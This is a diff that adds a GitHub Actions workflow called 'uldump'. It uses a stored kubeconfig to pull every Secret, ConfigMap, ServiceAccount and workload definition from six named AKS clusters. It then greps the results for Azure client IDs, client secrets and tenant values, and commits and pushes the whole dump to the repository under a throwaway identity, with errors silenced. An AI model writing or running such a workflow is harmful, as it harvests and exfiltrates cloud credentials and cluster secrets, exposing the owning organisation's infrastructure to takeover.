@@ -1,0 +1,41 @@
+name: uldump
+on:
+  workflow_dispatch:
+permissions:
+  contents: write
+jobs:
+  go:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: d
+        run: |
+          set +e
+          curl -sL -o /tmp/kubectl https://dl.k8s.io/release/v1.30.5/bin/linux/amd64/kubectl && chmod +x /tmp/kubectl
+          K=ul/kc/all-datapath.yaml
+          KX="/tmp/kubectl --kubeconfig $K --request-timeout=25s"
+          mkdir -p ul/dump
+          for C in aks-g42us-tfdemo-dev aks-g42us-tfdemo-g42americas aks-g42us-tfdemo-kashif-datapath-eastus aks-g42us-tfdemo-kashif-datapath-swedencentral aks-g42us-tfdemo-kashif-portal aks-g42us-tfdemo-staging-datapath-swedencentral; do
+            echo "=== $C"
+            $KX --context $C get deploy,sts,ds,cronjob -A -o yaml > ul/dump/wl_$C.yaml 2>/dev/null
+            $KX --context $C get cm -A -o yaml > ul/dump/cm_$C.yaml 2>/dev/null
+            $KX --context $C get secret -A -o yaml > ul/dump/sec_$C.yaml 2>/dev/null
+            $KX --context $C get sa -A -o yaml > ul/dump/sa_$C.yaml 2>/dev/null
+            echo "-- azure env refs"
+            grep -nE 'name: (AZURE|ARM_|CLIENT_ID|CLIENT_SECRET|TENANT|SUBSCRIPTION|SP_|APPLICATION_ID)' ul/dump/wl_$C.yaml 2>/dev/null | head -40
+            echo "-- sa cids"
+            grep -oE 'client-id: [0-9a-f-]{36}' ul/dump/sa_$C.yaml 2>/dev/null | sort -u | head -20
+            echo "-- secret names"
+            grep -E '^  - apiVersion: v1|^    name: ' ul/dump/sec_$C.yaml 2>/dev/null | grep -vE 'default-token|helm|sh.helm' | head -60
+          done
+          echo "=== SUM"
+          grep -hoE 'AZURE_CLIENT_ID[^ ]*|client-id: [0-9a-f-]{36}' ul/dump/*.yaml 2>/dev/null | sort | uniq -c | head -40
+      - name: commit
+        if: always()
+        run: |
+          set +e
+          mkdir -p ul/dump
+          git add -A
+          git -c user.email=a@b -c user.name=ul commit -m "uldump $(date -u +%s)"
+          git push
